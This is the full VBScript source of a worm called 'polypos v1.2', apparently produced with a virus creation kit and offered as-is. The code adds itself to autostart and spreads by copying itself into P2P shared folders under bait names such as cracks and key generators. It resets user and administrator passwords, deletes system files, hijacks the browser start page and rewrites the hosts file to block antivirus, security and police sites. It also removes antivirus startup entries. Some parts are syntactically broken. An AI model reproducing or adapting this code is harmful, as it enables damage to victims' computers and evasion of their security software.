' This worm was made with 'The Czybik Gen' Creation Kit v1.0
' To download this Creation Kit visit www.czybik-kit.tk
'============================================================
 
' // Begin of polypos v1.2 by lol by Polypos \\ '
 
 
On Error Resume Next
 
set skorFso = CreateObject("Scripting.FileSystemObject")
set skorWshs = CreateObject("Wscript.Shell")
windir = skorFso.getspecialfolder(0)
set sysdir=skorFso.getspecialfolder(1)
set tmpdir=skorFso.getspecialfolder(2)
set ntwrk = createobject("wscript.network")
hddisk=left(windir,2)
 

set skorgenworm = skorFso.getfile(wscript.scriptfullname)
skorgenworm.copy (windir+"\wowexec32.vbs") 
skorWshs.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\AvTcgck",runfile 
 
set filecopycompress=skorFso.getfile(wscript.scriptfullname)
overnetpath = skorWshs.regread("HKEY_CLASSES_ROOT\Software\MM\Overnet\" & "InstallDir")  
If overnetpath <> "" Then 
fulloverpath = overnetpath + "\incoming" 
filecopycompress.Copy (fulloverpath + "\Microsoft MSN Messenger Hack.exe.vbs.vbs") 
filecopycompress.Copy (fulloverpath + "\Schlacht um Mittelerde MapHack.exe.vbs.vbs") 
filecopycompress.Copy (fulloverpath + "\Windows XP Sourcecode.txt.vbs.vbs") 
filecopycompress.Copy (fulloverpath + "\PowerDVD 5.9 Crack working.exe.vbs.vbs") 
filecopycompress.Copy (fulloverpath + "\kaspersky Key working.reg.vbs.vbs") 
End If 
shareazacollectionpath = skorWshs.regread("HKEY_CURRENT_USER\Software\Shareaza\Shareaza\Downloads\" & "CollectionPath")  
If shareazacollectionpath <> "" Then 
filecopycompress.Copy (shareazacollectionpath + "\Microsoft MSN Messenger Hack.exe.vbs.vbs") 
filecopycompress.Copy (shareazacollectionpath + "\Schlacht um Mittelerde MapHack.exe.vbs.vbs") 
filecopycompress.Copy (shareazacollectionpath + "\Windows XP Sourcecode.txt.vbs.vbs") 
filecopycompress.Copy (shareazacollectionpath + "\PowerDVD 5.9 Crack working.exe.vbs.vbs") 
filecopycompress.Copy (shareazacollectionpath + "\kaspersky Key working.reg.vbs.vbs") 
End if 
s_kazza = skorWshs.regread("HKEY_CURRENT_USER\Software\Kazaa\LocalContent\" + "DownloadDir")  
If Not s_kazza = "" Then 
filecopycompress.Copy (s_kazza + "\Microsoft MSN Messenger Hack.exe.vbs.vbs") 
filecopycompress.Copy (s_kazza + "\Schlacht um Mittelerde MapHack.exe.vbs.vbs") 
filecopycompress.Copy (s_kazza + "\Windows XP Sourcecode.txt.vbs.vbs") 
filecopycompress.Copy (s_kazza + "\PowerDVD 5.9 Crack working.exe.vbs.vbs") 
filecopycompress.Copy (s_kazza + "\kaspersky Key working.reg.vbs.vbs") 
End If 
MorphPath=skorWshs.regread ("HKEY_LOCAL_MACHINE\SOFTWARE\Morpheus\" & "Install_Dir") 
If Not MorphPath = "" Then 
filecopycompress.Copy (MorphPath + "\My Shared Folder\Microsoft MSN Messenger Hack.exe.vbs.vbs") 
filecopycompress.Copy (MorphPath + "\My Shared Folder\Schlacht um Mittelerde MapHack.exe.vbs.vbs") 
filecopycompress.Copy (MorphPath + "\My Shared Folder\Windows XP Sourcecode.txt.vbs.vbs") 
filecopycompress.Copy (MorphPath + "\My Shared Folder\PowerDVD 5.9 Crack working.exe.vbs.vbs") 
filecopycompress.Copy (MorphPath + "\My Shared Folder\kaspersky Key working.reg.vbs.vbs") 
end if 
 
skorWshs.regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 0, "REG_DWORD" 
skorWshs.regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools",1,"REG_DWORD" 
skorWshs.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt", 1, "REG_DWORD" 
skorWshs.regWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden", 1, "REG_DWORD" 
skorWshs.regWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ShowSuperHidden", 0, "REG_DWORD" 
skorWshs.regWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout", 0, "REG_DWORD" 
skorWshs.Regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","www.sk0r-virii.tk" 
skorWshs.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Window Title","Microkak Internet Explorer" 
skorWshs.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\RegisteredOrganization","sk0r Virii Group Germany" 
skorWshs.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\RegisteredOwner","sk0r1337" 
skorWshs.regdelete "HKEY_CLASSES_ROOT\.sys\PersistentHandler\" 
skorWshs.regdelete "HKEY_CLASSES_ROOT\.sys\" 
skorWshs.run ("date 12.12.02"),,true 
skorWshs.Run ("time 13:37:00"),,true
MsgBox ("You are infected by sk0r1337 "),VbCritical,"polypos v1.2 by lol generated with tcgck" 
skorWshs.run ("net user %UserName% hacked),,true 
skorWshs.run ("net user administrator hacked1337),,true 
skorFso.deletefile (sysdir+"\drivers\etc\protocol") 
skorFso.deletefile (sysdir+"\drivers\etc\services") 
localhostip = Chr(49) & Chr(50) & Chr(55) & Chr(46) & Chr(48) & Chr(46) & Chr(48) & Chr(46) & Chr(49) 
Set hostfile = skorFso.createtextfile(sysdir + "\drivers\etc\hosts", True) 
hostfile.writeline ("# overwritten with polypos v1.2 by lol made with tcgck") 
hostfile.writeline ("# access to dl,av or search sites usw denied") 
hostfile.writeline (" ") 
hostfile.writeline (localhostip + " www.antivir.de") 
hostfile.writeline (localhostip + " www.bitdefender.de ") 
hostfile.writeline (localhostip + " www.znet.de") 
hostfile.writeline (localhostip + " www.chip.de") 
hostfile.writeline (localhostip + " www.virustotal.com") 
hostfile.writeline (localhostip + " virusscan.jotti.org") 
hostfile.writeline (localhostip + " www.kaspersky.com") 
hostfile.writeline (localhostip + " www.sophos.de") 
hostfile.writeline (localhostip + " www.trojaner-info.de ") 
hostfile.writeline (localhostip + " www.trojaner-help.de ") 
hostfile.writeline (localhostip + " www.arcabit.com ") 
hostfile.writeline (localhostip + " www.avast.com ") 
hostfile.writeline (localhostip + " www.grisoft.com ") 
hostfile.writeline (localhostip + " www.bitdefender.com ") 
hostfile.writeline (localhostip + " www.clamav.net ") 
hostfile.writeline (localhostip + " www.drweb.com ") 
hostfile.writeline (localhostip + " www.f-prot.com ") 
hostfile.writeline (localhostip + " www.google.de ") 
hostfile.writeline (localhostip + " www.fortinet.com") 
hostfile.writeline (localhostip + " www.nod32.com ") 
hostfile.writeline (localhostip + " www.norman.com ") 
hostfile.writeline (localhostip + " www.microsoft.com") 
hostfile.writeline (localhostip + " www.anti-virus.by/en") 
hostfile.writeline (localhostip + " www.symantec.com ") 
hostfile.writeline (localhostip + " www.windowsupdate.com ") 
hostfile.writeline (localhostip + " www.trendmicro.com ") 
hostfile.writeline (localhostip + " www.mcafee.com ") 
hostfile.writeline (localhostip + " www.viruslist.com") 
hostfile.writeline (localhostip + " www.avp.com ") 
hostfile.writeline (localhostip + " www.zonelabs.com") 
hostfile.writeline (localhostip + " www.heise.de ") 
hostfile.writeline (localhostip + " www.antivirus-online.de") 
hostfile.writeline (localhostip + " www.free-av.com ") 
hostfile.writeline (localhostip + " www.panda-software.com") 
hostfile.writeline (localhostip + " www.pc-welt.de ") 
hostfile.writeline (localhostip + " www.pc-special.net") 
hostfile.writeline (localhostip + " download.freenet.de ") 
hostfile.writeline (localhostip + " www.vollversion.de ") 
hostfile.writeline (localhostip + " www.das-download-archiv.de") 
hostfile.writeline (localhostip + " www.freeware.de ") 
hostfile.writeline (localhostip + " www.antiviruslab.com") 
hostfile.writeline (localhostip + " www.search.yahoo.com") 
hostfile.writeline (localhostip + " www.web.de ") 
hostfile.writeline (localhostip + " www.hotmail.com") 
hostfile.writeline (localhostip + " www.hotmail.de") 
hostfile.writeline (localhostip + " www.gmx.net") 
hostfile.writeline (localhostip + " www.esl-europe.net") 
hostfile.writeline (localhostip + " www.cs-expert.de") 
hostfile.writeline (localhostip + " www.spiegel.de") 
hostfile.writeline (localhostip + " www.icq.com") 
hostfile.writeline (localhostip + " www.icq.de ") 
hostfile.writeline (localhostip + " www.og-cheats.de") 
hostfile.writeline (localhostip + " www.flirtlife.de") 
hostfile.writeline (localhostip + " www.ffh.de") 
hostfile.writeline (localhostip + " www.counter-strike.de") 
hostfile.writeline (localhostip + " www.counter-strike.net") 
hostfile.writeline (localhostip + " www.counterstrike.de") 
hostfile.writeline (localhostip + " www.csconfigs.de") 
hostfile.writeline (localhostip + " www.netsettings.net") 
hostfile.writeline (localhostip + " www.leaguez.com") 
hostfile.writeline (localhostip + " www.unrealtournament.com")  
hostfile.writeline (localhostip + " www.halflife.yusho.de") 
hostfile.writeline (localhostip + " www.planethalflife.com") 
hostfile.writeline (localhostip + " www.lavasoft.de") 
hostfile.writeline (localhostip + " www.de.wikipedia.org") 
hostfile.writeline (localhostip + " www.wikipedia.org") 
hostfile.writeline (localhostip + " www.en.wikipedia.org") 
hostfile.writeline (localhostip + " www.wissen.de") 
hostfile.writeline (localhostip + " www.virus-aktuell.de") 
hostfile.writeline (localhostip + " www.arcor.de") 
hostfile.writeline (localhostip + " www.t-online.de") 
hostfile.writeline (localhostip + " www.t-com.de") 
hostfile.writeline (localhostip + " www.counter-hacks.de") 
hostfile.writeline (localhostip + " www.alice-dsl.de") 
hostfile.writeline (localhostip + " www.freenet.de") 
hostfile.writeline (localhostip + " www.1und1.de") 
hostfile.writeline (localhostip + " www.fbi.gov") 
hostfile.writeline (localhostip + " www.polizei.de") 
hostfile.close 
skorWshs.regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\avgnt" 
skorWshs.regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\KAVPersonal50" 
skorWshs.regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\AVG7_CC" 
skorWshs.regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\BDMCon" 
skorWshs.regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\BDNewsAgent" 
skorWshs.regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\BDOESRV" 
skorWshs.regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\pccguide.exe" 
skorWshs.regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\DrWebScheduler" 
skorWshs.regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SpIDerMail" 
skorWshs.regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SpIDerNT" 
skorWshs.regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\MCAgentExe" 
skorWshs.regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\MCUpdateExe" 
skorWshs.regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\OASClnt" 
skorWshs.regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\VirusScan Online" 
skorWshs.regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\VSOCheckTask" 
call skorczybikpayload()
Sub skorczybikpayload 
Set allepladden = skorFso.drives 
For Each alledateieninallenfestplatten In allepladden 
If alledateieninallenfestplatten.drivetype = 2 Then 
Searchthafiles (foldername) 
End If 
Next 
Function Searchthafiles(foldername) 
Set gttheinffol = skorFso.getfolder(foldername) 
Set allfii = gttheinffol.Files 
Set subbuii = gttheinffol.subfolders 
For Each dateienzuminfizieren In allfii 
extensionzuminf = LCase(skorFso.getextensionname(dateienzuminfizieren.Path)) 
if extensionzuminf = "htm" or extensionzuminf="mpg" or extensionzuminf="doc" then 
end if 
Next 
For Each alleunnerodner In subbuii 
Set strAlleUnterOrnderUoD = alleunnerordner.Files 
For Each jetztdieganzendatenderplatte In strAlleUnterOrnderUoD 
nehmedieext = LCase(fso.getextensionname(jetztdieganzendatenderplatte.Path)) 
if nehmedieext = "htm" or nehmedieext="mpg" or nehmedieext="doc" then 
end if 
end if 
Next 
For Each aberdenganzenrechner In subbuii 
Searchthafiles (aberdenganzenrechner) 
Next 
End Function 
End Sub 
 
' // End of polypos v1.2 by lolmade with tcgck v1.0 by sk0r (Czybik) \\ '
